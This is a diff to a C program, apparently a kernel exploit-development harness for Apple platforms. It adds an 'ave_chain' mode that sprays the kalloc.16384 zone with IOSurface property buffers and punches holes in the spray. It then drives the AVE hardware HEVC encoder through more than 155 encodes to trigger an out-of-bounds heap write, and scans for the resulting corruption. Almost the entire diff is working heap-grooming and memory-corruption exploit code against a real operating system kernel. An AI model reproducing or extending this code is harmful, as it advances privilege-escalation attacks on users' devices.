@@ -7530,6 +7530,222 @@ vps_cd_done:
 
         rlog("\n=== HEAP_SPRAY_OOB complete ===\n");
 
+    } else if (strcmp(mode, "ave_chain") == 0) {
+        /*
+         * ave_chain — AVE OOB write + kalloc.16384 property spray
+         *
+         * The AVE sHEVC_VPS struct is 8576 bytes in kalloc.16384.
+         * IOSurface property data (OSData backing buffers) can also land
+         * in kalloc.16384 if the value is ~12-14KB.
+         *
+         * Strategy:
+         * 1. Spray kalloc.16384 with IOSurface property buffers (14KB each)
+         *    filled with known sentinel pattern (0xCAFEBABE + index)
+         * 2. Free strategic surfaces to create holes
+         * 3. Create AVE encoder — sHEVC_VPS lands in a hole
+         * 4. Trigger 155+ encodes — table 2 OOB writes past buffer end
+         * 5. Read back all property values to detect corruption
+         *
+         * Key: we use CFData (raw bytes) instead of CFNumber so the kernel
+         * allocates an OSData with a ~14KB backing buffer in kalloc.16384.
+         */
+        int spray_count = (argc > 2) ? atoi(argv[2]) : 512;
+        int encode_count = (argc > 3) ? atoi(argv[3]) : 170;
+        int hole_stride = (argc > 4) ? atoi(argv[4]) : 4;
+        int prop_size = (argc > 5) ? atoi(argv[5]) : 14000;
+        if (spray_count < 32) spray_count = 32;
+        if (spray_count > 2048) spray_count = 2048;
+        if (prop_size < 8192) prop_size = 8192;
+        if (prop_size > 15000) prop_size = 15000;
+
+        rlog("=== AVE_CHAIN: kalloc.16384 spray + AVE OOB ===\n");
+        rlog("Spray: %d surfaces, prop_size=%d, encodes=%d, hole_stride=%d\n\n",
+            spray_count, prop_size, encode_count, hole_stride);
+
+        IOSurfaceRef *surfs = calloc(spray_count, sizeof(IOSurfaceRef));
+        if (!surfs) { rlog("FAIL: calloc\n"); goto done; }
+
+        /* Phase 1: Spray kalloc.16384 with large property values */
+        rlog("--- Phase 1: Spray %d IOSurface objects with %dB properties ---\n",
+            spray_count, prop_size);
+
+        uint8_t *sentinel_buf = malloc(prop_size);
+        int created = 0;
+        for (int i = 0; i < spray_count; i++) {
+            int sw = 32, sh = 32, sbpp = 4, sbpr = sw * sbpp;
+            CFMutableDictionaryRef sp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef swn = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+            CFNumberRef shn = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+            CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sbpp);
+            CFNumberRef sbrn = CFNumberCreate(NULL, kCFNumberIntType, &sbpr);
+            int pf = 0x42475241;
+            CFNumberRef spfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceWidth"), swn);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceHeight"), shn);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerElement"), sbn);
+            CFDictionarySetValue(sp, CFSTR("IOSurfaceBytesPerRow"), sbrn);
+            CFDictionarySetValue(sp, CFSTR("IOSurfacePixelFormat"), spfn);
+            surfs[i] = IOSurfaceCreate(sp);
+            CFRelease(sp); CFRelease(swn); CFRelease(shn);
+            CFRelease(sbn); CFRelease(sbrn); CFRelease(spfn);
+
+            if (surfs[i]) {
+                /* Fill sentinel buffer: repeating 4-byte pattern per surface */
+                uint32_t pat = 0xCAFE0000 | (uint16_t)i;
+                for (int j = 0; j < prop_size / 4; j++)
+                    ((uint32_t*)sentinel_buf)[j] = pat;
+                CFDataRef dval = CFDataCreate(NULL, sentinel_buf, prop_size);
+                IOSurfaceSetValue(surfs[i], CFSTR("SPRAY"), dval);
+                CFRelease(dval);
+                created++;
+            }
+        }
+        rlog("Created: %d / %d\n", created, spray_count);
+
+        /* Phase 2: Free holes */
+        rlog("\n--- Phase 2: Free every %dth surface ---\n", hole_stride);
+        int freed = 0;
+        for (int i = hole_stride / 2; i < spray_count; i += hole_stride) {
+            if (surfs[i]) {
+                CFRelease((CFTypeRef)surfs[i]);
+                surfs[i] = NULL;
+                freed++;
+            }
+        }
+        rlog("Freed %d surfaces (holes)\n", freed);
+
+        /* Phase 3: Create AVE encoder and trigger OOB writes */
+        rlog("\n--- Phase 3: AVE encoder — %d encodes ---\n", encode_count);
+        VTCompressionSessionRef ave_sess = NULL;
+        CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(enc_spec,
+            CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+
+        OSStatus st = VTCompressionSessionCreate(NULL, 192, 192,
+            (CMVideoCodecType)0x6D757861, enc_spec, NULL, NULL,
+            encode_cb, NULL, &ave_sess);
+        CFRelease(enc_spec);
+
+        if (st != noErr || !ave_sess) {
+            rlog("FAIL: VTCompressionSessionCreate = %d\n", (int)st);
+        } else {
+            VTSessionSetProperty(ave_sess, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+            VTSessionSetProperty(ave_sess, CFSTR("EncodesAlpha"), kCFBooleanTrue);
+            int aid = 128;
+            CFNumberRef aidn = CFNumberCreate(NULL, kCFNumberIntType, &aid);
+            VTSessionSetProperty(ave_sess, CFSTR("RequiredHEVCVideoParameterSetAlphaLayerID"), aidn);
+            CFRelease(aidn);
+
+            st = VTCompressionSessionPrepareToEncodeFrames(ave_sess);
+            rlog("PrepareToEncodeFrames: %d\n", (int)st);
+
+            if (st == noErr) {
+                int enc_ok = 0, enc_fail = 0;
+                for (int e = 0; e < encode_count; e++) {
+                    g_encode_done = 0; g_cb_status = -999;
+                    CVPixelBufferRef pb = NULL;
+                    CVPixelBufferCreate(NULL, 192, 192, kCVPixelFormatType_32BGRA, NULL, &pb);
+                    if (pb) {
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        void *base = CVPixelBufferGetBaseAddress(pb);
+                        if (base) memset(base, (uint8_t)(e & 0xFF), CVPixelBufferGetDataSize(pb));
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+                        CMTime pts = CMTimeMake(e, 30);
+                        st = VTCompressionSessionEncodeFrame(ave_sess, pb, pts,
+                            kCMTimeInvalid, NULL, NULL, NULL);
+                        if (st == noErr) {
+                            for (int w = 0; w < 100 && !g_encode_done; w++) usleep(10000);
+                            if (g_cb_status == noErr) enc_ok++;
+                            else enc_fail++;
+                        } else {
+                            enc_fail++;
+                        }
+                        CVPixelBufferRelease(pb);
+                    }
+                    if ((e + 1) % 50 == 0)
+                        rlog("  encoded %d/%d (ok=%d fail=%d)\n", e+1, encode_count, enc_ok, enc_fail);
+                }
+                rlog("Encoding complete: ok=%d fail=%d\n", enc_ok, enc_fail);
+            }
+
+            VTCompressionSessionInvalidate(ave_sess);
+            CFRelease(ave_sess);
+        }
+
+        /* Phase 4: Check all spray values for corruption */
+        rlog("\n--- Phase 4: Check spray values for corruption ---\n");
+        int corrupted = 0, checked = 0;
+        for (int i = 0; i < spray_count; i++) {
+            if (!surfs[i]) continue;
+            checked++;
+
+            CFDataRef rv = (CFDataRef)IOSurfaceCopyValue(surfs[i], CFSTR("SPRAY"));
+            if (!rv) {
+                rlog("  *** surf[%d]: SPRAY value MISSING ***\n", i);
+                corrupted++;
+                continue;
+            }
+            if (CFGetTypeID(rv) != CFDataGetTypeID()) {
+                rlog("  *** surf[%d]: SPRAY type changed! ***\n", i);
+                corrupted++;
+                CFRelease(rv);
+                continue;
+            }
+
+            const uint8_t *bytes = CFDataGetBytePtr(rv);
+            CFIndex len = CFDataGetLength(rv);
+            uint32_t expected_pat = 0xCAFE0000 | (uint16_t)i;
+            int mismatches = 0;
+            int first_mismatch_off = -1;
+            uint32_t first_got = 0;
+            for (int j = 0; j < (int)(len / 4); j++) {
+                uint32_t got;
+                memcpy(&got, bytes + j * 4, 4);
+                if (got != expected_pat) {
+                    if (mismatches == 0) {
+                        first_mismatch_off = j * 4;
+                        first_got = got;
+                    }
+                    mismatches++;
+                }
+            }
+
+            if (mismatches > 0) {
+                corrupted++;
+                rlog("  *** CORRUPTED surf[%d]: %d/%d dwords bad, first at +%d: 0x%08x (expected 0x%08x) ***\n",
+                    i, mismatches, (int)(len/4), first_mismatch_off, first_got, expected_pat);
+                /* Dump first 64 bytes around corruption */
+                if (first_mismatch_off >= 0) {
+                    int dump_start = (first_mismatch_off / 16) * 16;
+                    rlog("    Hex dump at +%d:\n    ", dump_start);
+                    for (int d = dump_start; d < dump_start + 64 && d < (int)len; d++) {
+                        rlog("%02x", bytes[d]);
+                        if ((d + 1) % 4 == 0) rlog(" ");
+                        if ((d + 1) % 16 == 0 && d + 1 < dump_start + 64) rlog("\n    ");
+                    }
+                    rlog("\n");
+                }
+            }
+
+            CFRelease(rv);
+        }
+
+        rlog("\nResults: checked=%d corrupted=%d\n", checked, corrupted);
+        if (corrupted > 0)
+            rlog("*** HEAP CORRUPTION DETECTED — AVE OOB wrote into IOSurface property data ***\n");
+        else
+            rlog("No corruption detected in this run.\n");
+        rlog("(If no corruption: try more surfaces, different prop_size, or multiple runs)\n");
+
+        for (int i = 0; i < spray_count; i++)
+            if (surfs[i]) CFRelease((CFTypeRef)surfs[i]);
+        free(surfs);
+        free(sentinel_buf);
+
+        rlog("\n=== AVE_CHAIN complete ===\n");
+
     } else if (strcmp(mode, "oob_crash_scan") == 0) {
         /*
          * oob_crash_scan — Find which OOB index hits critical struct fields
